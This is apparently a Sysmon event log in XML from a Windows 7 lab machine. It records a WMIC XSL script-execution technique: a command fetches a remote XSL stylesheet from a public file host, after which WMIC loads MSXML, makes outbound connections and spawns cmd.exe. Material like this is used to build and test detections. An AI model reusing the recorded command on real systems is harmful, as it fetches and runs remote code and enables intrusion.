<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:48:35.487223700Z" />
      <EventRecordID>891</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="EventType">SetValue</Data>
      <Data Name="UtcTime">2019-05-23 16:48:35.468</Data>
      <Data Name="ProcessGuid">{365ABB72-CE6D-5CE6-0000-001032020100}</Data>
      <Data Name="ProcessId">1332</Data>
      <Data Name="Image">C:\Windows\System32\spoolsv.exe</Data>
      <Data Name="TargetObject">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\DefaultSpoolDirectory</Data>
      <Data Name="Details">C:\Windows\system32\spool\PRINTERS</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:49:05.736570500Z" />
      <EventRecordID>892</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-23 16:49:05.686</Data>
      <Data Name="ProcessGuid">{365ABB72-CF01-5CE6-0000-00105DA50C00}</Data>
      <Data Name="ProcessId">3872</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Commandline Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">wmic  process list /format:"https://a.uguu.se/x50IGVBRfr55_test.xsl"</Data>
      <Data Name="CurrentDirectory">c:\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-CE6C-5CE6-0000-002047F30000}</Data>
      <Data Name="LogonId">0xf347</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443</Data>
      <Data Name="ParentProcessGuid">{365ABB72-CE84-5CE6-0000-001094130600}</Data>
      <Data Name="ParentProcessId">2940</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>7</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>7</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:49:05.862062500Z" />
      <EventRecordID>893</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">Execution - Suspicious Microsoft.XMLDOM module load</Data>
      <Data Name="UtcTime">2019-05-23 16:49:05.786</Data>
      <Data Name="ProcessGuid">{365ABB72-CF01-5CE6-0000-00105DA50C00}</Data>
      <Data Name="ProcessId">3872</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="ImageLoaded">C:\Windows\System32\msxml3.dll</Data>
      <Data Name="FileVersion">8.110.7601.23648</Data>
      <Data Name="Description">MSXML 3.0 SP11</Data>
      <Data Name="Product">Microsoft(R) MSXML 3.0 SP11</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="Hashes">SHA1=723644A78C703DF177235E820A906B9621B9B2FB,MD5=3CB096F266A52F65A571B2A3FC81D13E,SHA256=12D498F5310AD70818C7251B5D6AAF145CD7FA67887125645E245D856347BFAA,IMPHASH=EF7BEA73AB4F834F0C44DDE0150B5648</Data>
      <Data Name="Signed">true</Data>
      <Data Name="Signature">Microsoft Windows</Data>
      <Data Name="SignatureStatus">Valid</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:49:07.731893300Z" />
      <EventRecordID>894</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-23 16:49:07.731</Data>
      <Data Name="ProcessGuid">{365ABB72-CF01-5CE6-0000-00105DA50C00}</Data>
      <Data Name="ProcessId">3872</Data>
      <Data Name="Image">C:\Windows\System32\Wbem\WMIC.exe</Data>
      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\S97WTYG7\x50IGVBRfr55_test[1].xsl</Data>
      <Data Name="CreationUtcTime">2019-05-23 16:49:07.731</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:49:08.208762900Z" />
      <EventRecordID>895</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2096" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-23 16:49:07.834</Data>
      <Data Name="ProcessGuid">{365ABB72-CF01-5CE6-0000-00105DA50C00}</Data>
      <Data Name="ProcessId">3872</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">10.0.2.15</Data>
      <Data Name="SourceHostname">IEWIN7..home</Data>
      <Data Name="SourcePort">49167</Data>
      <Data Name="SourcePortName">
      </Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">45.76.12.27</Data>
      <Data Name="DestinationHostname">45-76-12-27.static.afterburst.com</Data>
      <Data Name="DestinationPort">443</Data>
      <Data Name="DestinationPortName">https</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:49:08.422099300Z" />
      <EventRecordID>896</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-23 16:49:08.258</Data>
      <Data Name="ProcessGuid">{365ABB72-CF04-5CE6-0000-001010F20C00}</Data>
      <Data Name="ProcessId">4056</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
      <Data Name="Description">Windows Command Processor</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\cmd.exe" </Data>
      <Data Name="CurrentDirectory">c:\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-CE6C-5CE6-0000-002047F30000}</Data>
      <Data Name="LogonId">0xf347</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
      <Data Name="ParentProcessGuid">{365ABB72-CF01-5CE6-0000-00105DA50C00}</Data>
      <Data Name="ParentProcessId">3872</Data>
      <Data Name="ParentImage">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="ParentCommandLine">wmic  process list /format:"https://a.uguu.se/x50IGVBRfr55_test.xsl"</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:49:09.576625700Z" />
      <EventRecordID>897</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2096" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-23 16:49:08.482</Data>
      <Data Name="ProcessGuid">{365ABB72-CF01-5CE6-0000-00105DA50C00}</Data>
      <Data Name="ProcessId">3872</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">10.0.2.15</Data>
      <Data Name="SourceHostname">IEWIN7..home</Data>
      <Data Name="SourcePort">49168</Data>
      <Data Name="SourcePortName">
      </Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">105.73.6.105</Data>
      <Data Name="DestinationHostname">aka105.inwitelecom.net</Data>
      <Data Name="DestinationPort">80</Data>
      <Data Name="DestinationPortName">http</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-23T16:50:44.582500100Z" />
      <EventRecordID>898</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-23 16:50:44.430</Data>
      <Data Name="ProcessGuid">{365ABB72-CF64-5CE6-0000-0010CBD51100}</Data>
      <Data Name="ProcessId">708</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIADAP.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Reverse Performance Adapter Maintenance Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">wmiadap.exe /F /T /R</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
      <Data Name="LogonGuid">{365ABB72-4CF8-5CE7-0000-0020E7030000}</Data>
      <Data Name="LogonId">0x3e7</Data>
      <Data Name="TerminalSessionId">0</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=DC6DC543EAC398DE6821325BFF3625C1CFC8EC3D,MD5=52799EAD792B0E9AE7FD4BA5BD18FE5C,SHA256=BE4838F4DB23D56CF75730DD36451C5F0F2ACA36B8A74844E7675DC5D5AD0C58,IMPHASH=FAAD498DDAEF07E1AF22EEF06D02AE2C</Data>
      <Data Name="ParentProcessGuid">{365ABB72-CE6B-5CE6-0000-001003D30000}</Data>
      <Data Name="ParentProcessId">896</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs</Data>
    </EventData>
  </Event>
</root>